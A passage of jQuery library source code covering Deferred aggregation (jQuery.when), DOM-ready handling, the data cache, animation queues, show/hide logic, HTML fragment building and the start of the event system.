},

// Deferred helper
when: function( singleValue ) {
    var

        // count of uncompleted subordinates
        remaining = arguments.length,

        // count of unprocessed arguments
        i = remaining,

        // subordinate fulfillment data
        resolveContexts = Array( i ),
        resolveValues = slice.call( arguments ),

        // the primary Deferred
        primary = jQuery.Deferred(),

        // subordinate callback factory
        updateFunc = function( i ) {
            return function( value ) {
                resolveContexts[ i ] = this;
                resolveValues[ i ] = arguments.length > 1 ? slice.call( arguments ) : value;
                if ( !( --remaining ) ) {
                    primary.resolveWith( resolveContexts, resolveValues );
                }
            };
        };

    // Single- and empty arguments are adopted like Promise.resolve
    if ( remaining <= 1 ) {
        adoptValue( singleValue, primary.done( updateFunc( i ) ).resolve, primary.reject,
            !remaining );

        // Use .then() to unwrap secondary thenables (cf. gh-3000)
        if ( primary.state() === "pending" ||
            isFunction( resolveValues[ i ] && resolveValues[ i ].then ) ) {

            return primary.then();
        }
    }

    // Multiple arguments are aggregated like Promise.all array elements
    while ( i-- ) {
        adoptValue( resolveValues[ i ], updateFunc( i ), primary.reject );
    }

    return primary.promise();
}
} );


// These usually indicate a programmer mistake during development,
// warn about them ASAP rather than swallowing them by default.
var rerrorNames = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;

jQuery.Deferred.exceptionHook = function( error, stack ) {

// Support: IE 8 - 9 only
// Console exists when dev tools are open, which can happen at any time
if ( window.console && window.console.warn && error && rerrorNames.test( error.name ) ) {
    window.console.warn( "jQuery.Deferred exception: " + error.message, error.stack, stack );
}
};




jQuery.readyException = function( error ) {
window.setTimeout( function() {
    throw error;
} );
};




// The deferred used on DOM ready
var readyList = jQuery.Deferred();

jQuery.fn.ready = function( fn ) {

readyList
    .then( fn )

    // Wrap jQuery.readyException in a function so that the lookup
    // happens at the time of error handling instead of callback
    // registration.
    .catch( function( error ) {
        jQuery.readyException( error );
    } );

return this;
};

jQuery.extend( {

// Is the DOM ready to be used? Set to true once it occurs.
isReady: false,

// A counter to track how many items to wait for before
// the ready event fires. See #6781
readyWait: 1,

// Handle when the DOM is ready
ready: function( wait ) {

    // Abort if there are pending holds or we're already ready
    if ( wait === true ? --jQuery.readyWait : jQuery.isReady ) {
        return;
    }

    // Remember that the DOM is ready
    jQuery.isReady = true;

    // If a normal DOM Ready event fired, decrement, and wait if need be
    if ( wait !== true && --jQuery.readyWait > 0 ) {
        return;
    }

    // If there are functions bound, to execute
    readyList.resolveWith( document, [ jQuery ] );
}
} );

jQuery.ready.then = readyList.then;

// The ready event handler and self cleanup method
function completed() {
document.removeEventListener( "DOMContentLoaded", completed );
window.removeEventListener( "load", completed );
jQuery.ready();
}

// Catch cases where $(document).ready() is called
// after the browser event has already occurred.
// Support: IE <=9 - 10 only
// Older IE sometimes signals "interactive" too soon
if ( document.readyState === "complete" ||
( document.readyState !== "loading" && !document.documentElement.doScroll ) ) {

// Handle it asynchronously to allow scripts the opportunity to delay ready
window.setTimeout( jQuery.ready );

} else {

// Use the handy event callback
document.addEventListener( "DOMContentLoaded", completed );

// A fallback to window.onload, that will always work
window.addEventListener( "load", completed );
}




// Multifunctional method to get and set values of a collection
// The value/s can optionally be executed if it's a function
var access = function( elems, fn, key, value, chainable, emptyGet, raw ) {
var i = 0,
    len = elems.length,
    bulk = key == null;

// Sets many values
if ( toType( key ) === "object" ) {
    chainable = true;
    for ( i in key ) {
        access( elems, fn, i, key[ i ], true, emptyGet, raw );
    }

// Sets one value
} else if ( value !== undefined ) {
    chainable = true;

    if ( !isFunction( value ) ) {
        raw = true;
    }

    if ( bulk ) {

        // Bulk operations run against the entire set
        if ( raw ) {
            fn.call( elems, value );
            fn = null;

        // ...except when executing function values
        } else {
            bulk = fn;
            fn = function( elem, _key, value ) {
                return bulk.call( jQuery( elem ), value );
            };
        }
    }

    if ( fn ) {
        for ( ; i < len; i++ ) {
            fn(
                elems[ i ], key, raw ?
                    value :
                    value.call( elems[ i ], i, fn( elems[ i ], key ) )
            );
        }
    }
}

if ( chainable ) {
    return elems;
}

// Gets
if ( bulk ) {
    return fn.call( elems );
}

return len ? fn( elems[ 0 ], key ) : emptyGet;
};


// Matches dashed string for camelizing
var rmsPrefix = /^-ms-/,
rdashAlpha = /-([a-z])/g;

// Used by camelCase as callback to replace()
function fcamelCase( _all, letter ) {
return letter.toUpperCase();
}

// Convert dashed to camelCase; used by the css and data modules
// Support: IE <=9 - 11, Edge 12 - 15
// Microsoft forgot to hump their vendor prefix (#9572)
function camelCase( string ) {
return string.replace( rmsPrefix, "ms-" ).replace( rdashAlpha, fcamelCase );
}
var acceptData = function( owner ) {

// Accepts only:
//  - Node
//    - Node.ELEMENT_NODE
//    - Node.DOCUMENT_NODE
//  - Object
//    - Any
return owner.nodeType === 1 || owner.nodeType === 9 || !( +owner.nodeType );
};




function Data() {
this.expando = jQuery.expando + Data.uid++;
}

Data.uid = 1;

Data.prototype = {

cache: function( owner ) {

    // Check if the owner object already has a cache
    var value = owner[ this.expando ];

    // If not, create one
    if ( !value ) {
        value = {};

        // We can accept data for non-element nodes in modern browsers,
        // but we should not, see #8335.
        // Always return an empty object.
        if ( acceptData( owner ) ) {

            // If it is a node unlikely to be stringify-ed or looped over
            // use plain assignment
            if ( owner.nodeType ) {
                owner[ this.expando ] = value;

            // Otherwise secure it in a non-enumerable property
            // configurable must be true to allow the property to be
            // deleted when data is removed
            } else {
                Object.defineProperty( owner, this.expando, {
                    value: value,
                    configurable: true
                } );
            }
        }
    }

    return value;
},
set: function( owner, data, value ) {
    var prop,
        cache = this.cache( owner );

    // Handle: [ owner, key, value ] args
    // Always use camelCase key (gh-2257)
    if ( typeof data === "string" ) {
        cache[ camelCase( data ) ] = value;

    // Handle: [ owner, { properties } ] args
    } else {

        // Copy the properties one-by-one to the cache object
        for ( prop in data ) {
            cache[ camelCase( prop ) ] = data[ prop ];
        }
    }
    return cache;
},
get: function( owner, key ) {
    return key === undefined ?
        this.cache( owner ) :

        // Always use camelCase key (gh-2257)
        owner[ this.expando ] && owner[ this.expando ][ camelCase( key ) ];
},
access: function( owner, key, value ) {

    // In cases where either:
    //
    //   1. No key was specified
    //   2. A string key was specified, but no value provided
    //
    // Take the "read" path and allow the get method to determine
    // which value to return, respectively either:
    //
    //   1. The entire cache object
    //   2. The data stored at the key
    //
    if ( key === undefined ||
            ( ( key && typeof key === "string" ) && value === undefined ) ) {

        return this.get( owner, key );
    }

    // When the key is not a string, or both a key and value
    // are specified, set or extend (existing objects) with either:
    //
    //   1. An object of properties
    //   2. A key and value
    //
    this.set( owner, key, value );

    // Since the "set" path can have two possible entry points
    // return the expected data based on which path was taken[*]
    return value !== undefined ? value : key;
},
remove: function( owner, key ) {
    var i,
        cache = owner[ this.expando ];

    if ( cache === undefined ) {
        return;
    }

    if ( key !== undefined ) {

        // Support array or space separated string of keys
        if ( Array.isArray( key ) ) {

            // If key is an array of keys...
            // We always set camelCase keys, so remove that.
            key = key.map( camelCase );
        } else {
            key = camelCase( key );

            // If a key with the spaces exists, use it.
            // Otherwise, create an array by matching non-whitespace
            key = key in cache ?
                [ key ] :
                ( key.match( rnothtmlwhite ) || [] );
        }

        i = key.length;

        while ( i-- ) {
            delete cache[ key[ i ] ];
        }
    }

    // Remove the expando if there's no more data
    if ( key === undefined || jQuery.isEmptyObject( cache ) ) {

        // Support: Chrome <=35 - 45
        // Webkit & Blink performance suffers when deleting properties
        // from DOM nodes, so set to undefined instead
        // https://bugs.chromium.org/p/chromium/issues/detail?id=378607 (bug restricted)
        if ( owner.nodeType ) {
            owner[ this.expando ] = undefined;
        } else {
            delete owner[ this.expando ];
        }
    }
},
hasData: function( owner ) {
    var cache = owner[ this.expando ];
    return cache !== undefined && !jQuery.isEmptyObject( cache );
}
};
var dataPriv = new Data();

var dataUser = new Data();



//	Implementation Summary
//
//	1. Enforce API surface and semantic compatibility with 1.9.x branch
//	2. Improve the module's maintainability by reducing the storage
//		paths to a single mechanism.
//	3. Use the same single mechanism to support "private" and "user" data.
//	4. _Never_ expose "private" data to user code (TODO: Drop _data, _removeData)
//	5. Avoid exposing implementation details on user objects (eg. expando properties)
//	6. Provide a clear path for implementation upgrade to WeakMap in 2014

var rbrace = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
rmultiDash = /[A-Z]/g;

function getData( data ) {
if ( data === "true" ) {
    return true;
}

if ( data === "false" ) {
    return false;
}

if ( data === "null" ) {
    return null;
}

// Only convert to a number if it doesn't change the string
if ( data === +data + "" ) {
    return +data;
}

if ( rbrace.test( data ) ) {
    return JSON.parse( data );
}

return data;
}

function dataAttr( elem, key, data ) {
var name;

// If nothing was found internally, try to fetch any
// data from the HTML5 data-* attribute
if ( data === undefined && elem.nodeType === 1 ) {
    name = "data-" + key.replace( rmultiDash, "-$&" ).toLowerCase();
    data = elem.getAttribute( name );

    if ( typeof data === "string" ) {
        try {
            data = getData( data );
        } catch ( e ) {}

        // Make sure we set the data so it isn't changed later
        dataUser.set( elem, key, data );
    } else {
        data = undefined;
    }
}
return data;
}

jQuery.extend( {
hasData: function( elem ) {
    return dataUser.hasData( elem ) || dataPriv.hasData( elem );
},

data: function( elem, name, data ) {
    return dataUser.access( elem, name, data );
},

removeData: function( elem, name ) {
    dataUser.remove( elem, name );
},

// TODO: Now that all calls to _data and _removeData have been replaced
// with direct calls to dataPriv methods, these can be deprecated.
_data: function( elem, name, data ) {
    return dataPriv.access( elem, name, data );
},

_removeData: function( elem, name ) {
    dataPriv.remove( elem, name );
}
} );

jQuery.fn.extend( {
data: function( key, value ) {
    var i, name, data,
        elem = this[ 0 ],
        attrs = elem && elem.attributes;

    // Gets all values
    if ( key === undefined ) {
        if ( this.length ) {
            data = dataUser.get( elem );

            if ( elem.nodeType === 1 && !dataPriv.get( elem, "hasDataAttrs" ) ) {
                i = attrs.length;
                while ( i-- ) {

                    // Support: IE 11 only
                    // The attrs elements can be null (#14894)
                    if ( attrs[ i ] ) {
                        name = attrs[ i ].name;
                        if ( name.indexOf( "data-" ) === 0 ) {
                            name = camelCase( name.slice( 5 ) );
                            dataAttr( elem, name, data[ name ] );
                        }
                    }
                }
                dataPriv.set( elem, "hasDataAttrs", true );
            }
        }

        return data;
    }

    // Sets multiple values
    if ( typeof key === "object" ) {
        return this.each( function() {
            dataUser.set( this, key );
        } );
    }

    return access( this, function( value ) {
        var data;

        // The calling jQuery object (element matches) is not empty
        // (and therefore has an element appears at this[ 0 ]) and the
        // `value` parameter was not undefined. An empty jQuery object
        // will result in `undefined` for elem = this[ 0 ] which will
        // throw an exception if an attempt to read a data cache is made.
        if ( elem && value === undefined ) {

            // Attempt to get data from the cache
            // The key will always be camelCased in Data
            data = dataUser.get( elem, key );
            if ( data !== undefined ) {
                return data;
            }

            // Attempt to "discover" the data in
            // HTML5 custom data-* attrs
            data = dataAttr( elem, key );
            if ( data !== undefined ) {
                return data;
            }

            // We tried really hard, but the data doesn't exist.
            return;
        }

        // Set the data...
        this.each( function() {

            // We always store the camelCased key
            dataUser.set( this, key, value );
        } );
    }, null, value, arguments.length > 1, null, true );
},

removeData: function( key ) {
    return this.each( function() {
        dataUser.remove( this, key );
    } );
}
} );


jQuery.extend( {
queue: function( elem, type, data ) {
    var queue;

    if ( elem ) {
        type = ( type || "fx" ) + "queue";
        queue = dataPriv.get( elem, type );

        // Speed up dequeue by getting out quickly if this is just a lookup
        if ( data ) {
            if ( !queue || Array.isArray( data ) ) {
                queue = dataPriv.access( elem, type, jQuery.makeArray( data ) );
            } else {
                queue.push( data );
            }
        }
        return queue || [];
    }
},

dequeue: function( elem, type ) {
    type = type || "fx";

    var queue = jQuery.queue( elem, type ),
        startLength = queue.length,
        fn = queue.shift(),
        hooks = jQuery._queueHooks( elem, type ),
        next = function() {
            jQuery.dequeue( elem, type );
        };

    // If the fx queue is dequeued, always remove the progress sentinel
    if ( fn === "inprogress" ) {
        fn = queue.shift();
        startLength--;
    }

    if ( fn ) {

        // Add a progress sentinel to prevent the fx queue from being
        // automatically dequeued
        if ( type === "fx" ) {
            queue.unshift( "inprogress" );
        }

        // Clear up the last queue stop function
        delete hooks.stop;
        fn.call( elem, next, hooks );
    }

    if ( !startLength && hooks ) {
        hooks.empty.fire();
    }
},

// Not public - generate a queueHooks object, or return the current one
_queueHooks: function( elem, type ) {
    var key = type + "queueHooks";
    return dataPriv.get( elem, key ) || dataPriv.access( elem, key, {
        empty: jQuery.Callbacks( "once memory" ).add( function() {
            dataPriv.remove( elem, [ type + "queue", key ] );
        } )
    } );
}
} );

jQuery.fn.extend( {
queue: function( type, data ) {
    var setter = 2;

    if ( typeof type !== "string" ) {
        data = type;
        type = "fx";
        setter--;
    }

    if ( arguments.length < setter ) {
        return jQuery.queue( this[ 0 ], type );
    }

    return data === undefined ?
        this :
        this.each( function() {
            var queue = jQuery.queue( this, type, data );

            // Ensure a hooks for this queue
            jQuery._queueHooks( this, type );

            if ( type === "fx" && queue[ 0 ] !== "inprogress" ) {
                jQuery.dequeue( this, type );
            }
        } );
},
dequeue: function( type ) {
    return this.each( function() {
        jQuery.dequeue( this, type );
    } );
},
clearQueue: function( type ) {
    return this.queue( type || "fx", [] );
},

// Get a promise resolved when queues of a certain type
// are emptied (fx is the type by default)
promise: function( type, obj ) {
    var tmp,
        count = 1,
        defer = jQuery.Deferred(),
        elements = this,
        i = this.length,
        resolve = function() {
            if ( !( --count ) ) {
                defer.resolveWith( elements, [ elements ] );
            }
        };

    if ( typeof type !== "string" ) {
        obj = type;
        type = undefined;
    }
    type = type || "fx";

    while ( i-- ) {
        tmp = dataPriv.get( elements[ i ], type + "queueHooks" );
        if ( tmp && tmp.empty ) {
            count++;
            tmp.empty.add( resolve );
        }
    }
    resolve();
    return defer.promise( obj );
}
} );
var pnum = ( /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/ ).source;

var rcssNum = new RegExp( "^(?:([+-])=|)(" + pnum + ")([a-z%]*)$", "i" );


var cssExpand = [ "Top", "Right", "Bottom", "Left" ];

var documentElement = document.documentElement;



var isAttached = function( elem ) {
        return jQuery.contains( elem.ownerDocument, elem );
    },
    composed = { composed: true };

// Support: IE 9 - 11+, Edge 12 - 18+, iOS 10.0 - 10.2 only
// Check attachment across shadow DOM boundaries when possible (gh-3504)
// Support: iOS 10.0-10.2 only
// Early iOS 10 versions support `attachShadow` but not `getRootNode`,
// leading to errors. We need to check for `getRootNode`.
if ( documentElement.getRootNode ) {
    isAttached = function( elem ) {
        return jQuery.contains( elem.ownerDocument, elem ) ||
            elem.getRootNode( composed ) === elem.ownerDocument;
    };
}
var isHiddenWithinTree = function( elem, el ) {

    // isHiddenWithinTree might be called from jQuery#filter function;
    // in that case, element will be second argument
    elem = el || elem;

    // Inline style trumps all
    return elem.style.display === "none" ||
        elem.style.display === "" &&

        // Otherwise, check computed style
        // Support: Firefox <=43 - 45
        // Disconnected elements can have computed display: none, so first confirm that elem is
        // in the document.
        isAttached( elem ) &&

        jQuery.css( elem, "display" ) === "none";
};



function adjustCSS( elem, prop, valueParts, tween ) {
var adjusted, scale,
    maxIterations = 20,
    currentValue = tween ?
        function() {
            return tween.cur();
        } :
        function() {
            return jQuery.css( elem, prop, "" );
        },
    initial = currentValue(),
    unit = valueParts && valueParts[ 3 ] || ( jQuery.cssNumber[ prop ] ? "" : "px" ),

    // Starting value computation is required for potential unit mismatches
    initialInUnit = elem.nodeType &&
        ( jQuery.cssNumber[ prop ] || unit !== "px" && +initial ) &&
        rcssNum.exec( jQuery.css( elem, prop ) );

if ( initialInUnit && initialInUnit[ 3 ] !== unit ) {

    // Support: Firefox <=54
    // Halve the iteration target value to prevent interference from CSS upper bounds (gh-2144)
    initial = initial / 2;

    // Trust units reported by jQuery.css
    unit = unit || initialInUnit[ 3 ];

    // Iteratively approximate from a nonzero starting point
    initialInUnit = +initial || 1;

    while ( maxIterations-- ) {

        // Evaluate and update our best guess (doubling guesses that zero out).
        // Finish if the scale equals or crosses 1 (making the old*new product non-positive).
        jQuery.style( elem, prop, initialInUnit + unit );
        if ( ( 1 - scale ) * ( 1 - ( scale = currentValue() / initial || 0.5 ) ) <= 0 ) {
            maxIterations = 0;
        }
        initialInUnit = initialInUnit / scale;

    }

    initialInUnit = initialInUnit * 2;
    jQuery.style( elem, prop, initialInUnit + unit );

    // Make sure we update the tween properties later on
    valueParts = valueParts || [];
}

if ( valueParts ) {
    initialInUnit = +initialInUnit || +initial || 0;

    // Apply relative offset (+=/-=) if specified
    adjusted = valueParts[ 1 ] ?
        initialInUnit + ( valueParts[ 1 ] + 1 ) * valueParts[ 2 ] :
        +valueParts[ 2 ];
    if ( tween ) {
        tween.unit = unit;
        tween.start = initialInUnit;
        tween.end = adjusted;
    }
}
return adjusted;
}


var defaultDisplayMap = {};

function getDefaultDisplay( elem ) {
var temp,
    doc = elem.ownerDocument,
    nodeName = elem.nodeName,
    display = defaultDisplayMap[ nodeName ];

if ( display ) {
    return display;
}

temp = doc.body.appendChild( doc.createElement( nodeName ) );
display = jQuery.css( temp, "display" );

temp.parentNode.removeChild( temp );

if ( display === "none" ) {
    display = "block";
}
defaultDisplayMap[ nodeName ] = display;

return display;
}

function showHide( elements, show ) {
var display, elem,
    values = [],
    index = 0,
    length = elements.length;

// Determine new display value for elements that need to change
for ( ; index < length; index++ ) {
    elem = elements[ index ];
    if ( !elem.style ) {
        continue;
    }

    display = elem.style.display;
    if ( show ) {

        // Since we force visibility upon cascade-hidden elements, an immediate (and slow)
        // check is required in this first loop unless we have a nonempty display value (either
        // inline or about-to-be-restored)
        if ( display === "none" ) {
            values[ index ] = dataPriv.get( elem, "display" ) || null;
            if ( !values[ index ] ) {
                elem.style.display = "";
            }
        }
        if ( elem.style.display === "" && isHiddenWithinTree( elem ) ) {
            values[ index ] = getDefaultDisplay( elem );
        }
    } else {
        if ( display !== "none" ) {
            values[ index ] = "none";

            // Remember what we're overwriting
            dataPriv.set( elem, "display", display );
        }
    }
}

// Set the display of the elements in a second loop to avoid constant reflow
for ( index = 0; index < length; index++ ) {
    if ( values[ index ] != null ) {
        elements[ index ].style.display = values[ index ];
    }
}

return elements;
}

jQuery.fn.extend( {
show: function() {
    return showHide( this, true );
},
hide: function() {
    return showHide( this );
},
toggle: function( state ) {
    if ( typeof state === "boolean" ) {
        return state ? this.show() : this.hide();
    }

    return this.each( function() {
        if ( isHiddenWithinTree( this ) ) {
            jQuery( this ).show();
        } else {
            jQuery( this ).hide();
        }
    } );
}
} );
var rcheckableType = ( /^(?:checkbox|radio)$/i );

var rtagName = ( /<([a-z][^\/\0>\x20\t\r\n\f]*)/i );

var rscriptType = ( /^$|^module$|\/(?:java|ecma)script/i );



( function() {
var fragment = document.createDocumentFragment(),
    div = fragment.appendChild( document.createElement( "div" ) ),
    input = document.createElement( "input" );

// Support: Android 4.0 - 4.3 only
// Check state lost if the name is set (#11217)
// Support: Windows Web Apps (WWA)
// `name` and `type` must use .setAttribute for WWA (#14901)
input.setAttribute( "type", "radio" );
input.setAttribute( "checked", "checked" );
input.setAttribute( "name", "t" );

div.appendChild( input );

// Support: Android <=4.1 only
// Older WebKit doesn't clone checked state correctly in fragments
support.checkClone = div.cloneNode( true ).cloneNode( true ).lastChild.checked;

// Support: IE <=11 only
// Make sure textarea (and checkbox) defaultValue is properly cloned
div.innerHTML = "<textarea>x</textarea>";
support.noCloneChecked = !!div.cloneNode( true ).lastChild.defaultValue;

// Support: IE <=9 only
// IE <=9 replaces <option> tags with their contents when inserted outside of
// the select element.
div.innerHTML = "<option></option>";
support.option = !!div.lastChild;
} )();


// We have to close these tags to support XHTML (#13200)
var wrapMap = {

// XHTML parsers do not magically insert elements in the
// same way that tag soup parsers do. So we cannot shorten
// this by omitting <tbody> or other required elements.
thead: [ 1, "<table>", "</table>" ],
col: [ 2, "<table><colgroup>", "</colgroup></table>" ],
tr: [ 2, "<table><tbody>", "</tbody></table>" ],
td: [ 3, "<table><tbody><tr>", "</tr></tbody></table>" ],

_default: [ 0, "", "" ]
};

wrapMap.tbody = wrapMap.tfoot = wrapMap.colgroup = wrapMap.caption = wrapMap.thead;
wrapMap.th = wrapMap.td;

// Support: IE <=9 only
if ( !support.option ) {
wrapMap.optgroup = wrapMap.option = [ 1, "<select multiple='multiple'>", "</select>" ];
}


function getAll( context, tag ) {

// Support: IE <=9 - 11 only
// Use typeof to avoid zero-argument method invocation on host objects (#15151)
var ret;

if ( typeof context.getElementsByTagName !== "undefined" ) {
    ret = context.getElementsByTagName( tag || "*" );

} else if ( typeof context.querySelectorAll !== "undefined" ) {
    ret = context.querySelectorAll( tag || "*" );

} else {
    ret = [];
}

if ( tag === undefined || tag && nodeName( context, tag ) ) {
    return jQuery.merge( [ context ], ret );
}

return ret;
}


// Mark scripts as having already been evaluated
function setGlobalEval( elems, refElements ) {
var i = 0,
    l = elems.length;

for ( ; i < l; i++ ) {
    dataPriv.set(
        elems[ i ],
        "globalEval",
        !refElements || dataPriv.get( refElements[ i ], "globalEval" )
    );
}
}


var rhtml = /<|&#?\w+;/;

function buildFragment( elems, context, scripts, selection, ignored ) {
var elem, tmp, tag, wrap, attached, j,
    fragment = context.createDocumentFragment(),
    nodes = [],
    i = 0,
    l = elems.length;

for ( ; i < l; i++ ) {
    elem = elems[ i ];

    if ( elem || elem === 0 ) {

        // Add nodes directly
        if ( toType( elem ) === "object" ) {

            // Support: Android <=4.0 only, PhantomJS 1 only
            // push.apply(_, arraylike) throws on ancient WebKit
            jQuery.merge( nodes, elem.nodeType ? [ elem ] : elem );

        // Convert non-html into a text node
        } else if ( !rhtml.test( elem ) ) {
            nodes.push( context.createTextNode( elem ) );

        // Convert html into DOM nodes
        } else {
            tmp = tmp || fragment.appendChild( context.createElement( "div" ) );

            // Deserialize a standard representation
            tag = ( rtagName.exec( elem ) || [ "", "" ] )[ 1 ].toLowerCase();
            wrap = wrapMap[ tag ] || wrapMap._default;
            tmp.innerHTML = wrap[ 1 ] + jQuery.htmlPrefilter( elem ) + wrap[ 2 ];

            // Descend through wrappers to the right content
            j = wrap[ 0 ];
            while ( j-- ) {
                tmp = tmp.lastChild;
            }

            // Support: Android <=4.0 only, PhantomJS 1 only
            // push.apply(_, arraylike) throws on ancient WebKit
            jQuery.merge( nodes, tmp.childNodes );

            // Remember the top-level container
            tmp = fragment.firstChild;

            // Ensure the created nodes are orphaned (#12392)
            tmp.textContent = "";
        }
    }
}

// Remove wrapper from fragment
fragment.textContent = "";

i = 0;
while ( ( elem = nodes[ i++ ] ) ) {

    // Skip elements already in the context collection (trac-4087)
    if ( selection && jQuery.inArray( elem, selection ) > -1 ) {
        if ( ignored ) {
            ignored.push( elem );
        }
        continue;
    }

    attached = isAttached( elem );

    // Append to fragment
    tmp = getAll( fragment.appendChild( elem ), "script" );

    // Preserve script evaluation history
    if ( attached ) {
        setGlobalEval( tmp );
    }

    // Capture executables
    if ( scripts ) {
        j = 0;
        while ( ( elem = tmp[ j++ ] ) ) {
            if ( rscriptType.test( elem.type || "" ) ) {
                scripts.push( elem );
            }
        }
    }
}

return fragment;
}


var rtypenamespace = /^([^.]*)(?:\.(.+)|)/;

function returnTrue() {
return true;
}

function returnFalse() {
return false;
}

// Support: IE <=9 - 11+
// focus() and blur() are asynchronous, except when they are no-op.
// So expect focus to be synchronous when the element is already active,
// and blur to be synchronous when the element is not already active.
// (focus and blur are always synchronous in other supported browsers,
// this just defines when we can count on it).
function expectSync( elem, type ) {
return ( elem === safeActiveElement() ) === ( type === "focus" );
}

// Support: IE <=9 only
// Accessing document.activeElement can throw unexpectedly
// https://bugs.jquery.com/ticket/13393
function safeActiveElement() {
try {
    return document.activeElement;
} catch ( err ) { }
}

function on( elem, types, selector, data, fn, one ) {
var origFn, type;

// Types can be a map of types/handlers
if ( typeof types === "object" ) {

    // ( types-Object, selector, data )
    if ( typeof selector !== "string" ) {

        // ( types-Object, data )
        data = data || selector;
        selector = undefined;
    }
    for ( type in types ) {
        on( elem, type, selector, data, types[ type ], one );
    }
    return elem;
}

if ( data == null && fn == null ) {

    // ( types, fn )
    fn = selector;
    data = selector = undefined;
} else if ( fn == null ) {
    if ( typeof selector === "string" ) {

        // ( types, selector, fn )
        fn = data;
        data = undefined;
    } else {

        // ( types, data, fn )
        fn = data;
        data = selector;
        selector = undefined;
    }
}
if ( fn === false ) {
    fn = returnFalse;
} else if ( !fn ) {
    return elem;
}

if ( one === 1 ) {
    origFn = fn;
    fn = function( event ) {

        // Can use an empty set, since event contains the info
        jQuery().off( event );
        return origFn.apply( this, arguments );
    };

    // Use same guid so caller can remove using origFn
    fn.guid = origFn.guid || ( origFn.guid = jQuery.guid++ );
}
return elem.each( function() {
    jQuery.event.add( this, types, fn, data, selector );
} );
}

/*
* Helper functions for managing events -- not part of the public interface.
* Props to Dean Edwards' addEvent library for many of the ideas.
*/
jQuery.event = {

global: {},

add: function( elem, types, handler, data, selector ) {

    var handleObjIn, eventHandle, tmp,
        events, t, handleObj,
        special, handlers, type, namespaces, origType,
        elemData = dataPriv.get( elem );

    // Only attach events to objects that accept data
    if ( !acceptData( elem ) ) {
        return;
    }

    // Caller can pass in an object of custom data in lieu of the handler
    if ( handler.handler ) {
        handleObjIn = handler;
        handler = handleObjIn.handler;
        selector = handleObjIn.selector;
    }

    // Ensure that invalid selectors throw exceptions at attach time
    // Evaluate against documentElement in case elem is a non-element node (e.g., document)
    if ( selector ) {
        jQuery.find.matchesSelector( documentElement, selector );
    }

    // Make sure that the handler has a unique ID, used to find/remove it later
    if ( !handler.guid ) {
        handler.guid = jQuery.guid++;
    }

    // Init the element's event structure and main handler, if this is the first
    if ( !( events = elemData.events ) ) {
        events = elemData.events = Object.create( null );
    }
    if ( !( eventHandle = elemData.handle ) ) {
        eventHandle = elemData.handle = function( e ) {

            // Discard the second event of a jQuery.event.trigger() and
            // when an event is called after a page has unloaded
            return typeof jQuery !== "undefined" && jQuery.event.triggered !== e.type ?
                jQuery.event.dispatch.apply( elem, arguments ) : undefined;
        };
    }

    // Handle multiple events separated by a space
    types = ( types || "" ).match( rnothtmlwhite ) || [ "" ];
    t = types.length;
    while ( t-- ) {
        tmp = rtypenamespace.exec( types[ t ] ) || [];
        type = origType = tmp[ 1 ];
        namespaces = ( tmp[ 2 ] || "" ).split( "." ).sort();

        // There *must* be a type, no attaching namespace-only handlers
        if ( !type ) {
            continue;
        }

        // If event changes its type, use the special event handlers for the changed type
        special = jQuery.event.special[ type ] || {};

        // If selector defined, determine special event api type, otherwise given type
        type = ( selector ? special.delegateType : special.bindType ) || type;

        // Update special based on newly reset type
        special = jQuery.event.special[ type ] || {};

        // handleObj is passed to all event handlers
        handleObj = jQuery.extend( {
            type: type,
            origType: origType,
            data: data,
            handler: handler,
            guid: handler.guid,
            selector: selector,
            needsContext: selector && jQuery.expr.match.needsContext.test( selector ),
            namespace: namespaces.join( "." )
        }, handleObjIn );

        // Init the event handler queue if we're the first
        if ( !( handlers = events[ type ] ) ) {
            handlers = events[ type ] = [];
            handlers.delegateCount = 0;

            // Only use addEventListener if the special events handler returns false
            if ( !special.setup ||
                special.setup.call( elem, data, namespaces, eventHandle ) === false ) {

                if ( elem.addEventListener ) {
                    elem.addEventListener( type, eventHandle );
                }
            }
        }

        if ( special.add ) {
            special.add.call( elem, handleObj );

            if ( !handleObj.handler.guid ) {
                handleObj.handler.guid = handler.guid;
            }
        }

        // Add to the element's handler list, delegates in front
        if ( selector ) {
            handlers.splice( handlers.delegateCount++, 0, handleObj );
        } else {
            handlers.push( handleObj );
        }

        // Keep track of which events have ever been used, for event optimization
        jQuery.event.global[ type ] = true;
    }

},

// Detach an event or set of events from an element
remove: function( elem, types, handler, selector, mappedTypes ) {

    var j, origCount, tmp,
        events, t, handleObj,
        special, handlers, type, namespaces, origType,
        elemData = dataPriv.hasData( elem ) && dataPriv.get( elem );

    if ( !elemData || !( events = elemData.events ) ) {
        return;
    }

    // Once for each type.namespace in types; type may be omitted
    types = ( types || "" ).match( rnothtmlwhite ) || [ "" ];
    t = types.length;
    while ( t-- ) {
        tmp = rtypenamespace.exec( types[ t ] ) || [];
        type = origType = tmp[ 1 ];
        namespaces = ( tmp[ 2 ] || "" ).split( "." ).sort();

        // Unbind all events (on this namespace, if provided) for the element
        if ( !type ) {
            for ( type in events ) {
                jQuery.event.remove( elem, type + types[ t ], handler, selector, true );
            }
            continue;
        }

        special = jQuery.event.special[ type ] || {};
        type = ( selector ? special.delegateType : special.bindType ) || type;
        handlers = events[ type ] || [];
        tmp = tmp[ 2 ] &&
            new RegExp( "(^|\\.)" + namespaces.join( "\\.(?:.*\\.|)" ) + "(\\.|$)" );

        // Remove matching events
        origCount = j = handlers.length;
        while ( j-- ) {
            handleObj = handlers[ j ];

            if ( ( mappedTypes || origType === handleObj.origType ) &&
                ( !handler || handler.guid === handleObj.guid ) &&
                ( !tmp || tmp.test( handleObj.namespace ) ) &&
                ( !selector || selector === handleObj.selector ||
                    selector === "**" && handleObj.selector ) ) {
                handlers.splice( j, 1 );

                if ( handleObj.selector ) {
                    handlers.delegateCount--;
                }
                if ( special.remove ) {
                    special.remove.call( elem, handleObj );
                }
            }
        }

        // Remove generic event handler if we removed something and no more handlers exist
        // (avoids potential for endless recursion during removal of special event handlers)
        if ( origCount && !handlers.length ) {
            if ( !special.teardown ||
                special.teardown.call( elem, namespaces, elemData.handle ) === false ) {

                jQuery.removeEvent( elem, type, elemData.handle );
            }

            delete events[ type ];
        }
    }

    // Remove data and the expando if it's no longer used
    if ( jQuery.isEmptyObject( events ) ) {
        dataPriv.remove( elem, "handle events" );
    }
},

dispatch: function( nativeEvent ) {

    var i, j, ret, matched, handleObj, handlerQueue,
        args = new Array( arguments.length ),

        // Make a writable jQuery.Event from the native event object
        event = jQuery.event.fix( nativeEvent ),

        handlers = (
